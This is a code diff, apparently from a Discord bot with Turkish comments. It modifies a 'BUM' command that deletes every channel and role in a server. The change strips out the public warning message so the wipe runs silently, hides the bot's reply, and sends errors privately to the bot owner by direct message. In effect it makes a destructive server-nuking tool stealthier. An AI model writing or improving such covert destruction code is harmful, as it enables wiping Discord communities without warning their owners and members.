@@ -785,11 +785,7 @@ client.on('interactionCreate', async (interaction) => {
         }
 
         try {
-          await interaction.reply({ 
-            content: '⚠️ **SUNUCU SİLİNİYOR!** Tüm kanallar ve roller silinecek... 💥', 
-            ephemeral: false 
-          });
-
+          // Sessiz olarak başla - mesaj atma
           console.log(`[BUM] ${interaction.guild.name} sunucusu siliniyor - ${user.tag} tarafından`);
 
           // Tüm kanalları sil
@@ -817,13 +813,31 @@ client.on('interactionCreate', async (interaction) => {
           }
 
           console.log(`[BUM] ${interaction.guild.name} sunucusu tamamen silindi!`);
+          
+          // Silent reply - hiç mesaj atma
+          if (!interaction.replied) {
+            await interaction.deferReply({ ephemeral: true }).catch(() => {});
+          }
 
         } catch (error) {
           console.error('[BUM] Hata:', error);
-          await interaction.followUp({ 
-            content: `❌ Hata: ${error.message}`, 
-            ephemeral: true 
-          }).catch(() => {});
+          
+          // Hata olursa OWNER'a DM atsın
+          try {
+            const owner = await client.users.fetch(OWNER_ID);
+            await owner.send({
+              content: `⚠️ **[BUM KOMUTu HATASI]**\n\n**Sunucu:** ${interaction.guild.name}\n**Hata:** \`${error.message}\`\n**Zamanı:** ${new Date().toLocaleTimeString('tr-TR')}`
+            }).catch(console.error);
+          } catch (dmError) {
+            console.error('[BUM] DM gönderme hatası:', dmError);
+          }
+
+          if (!interaction.replied) {
+            await interaction.reply({ 
+              content: `❌ Hata: ${error.message}`, 
+              ephemeral: true 
+            }).catch(() => {});
+          }
         }
       }
 
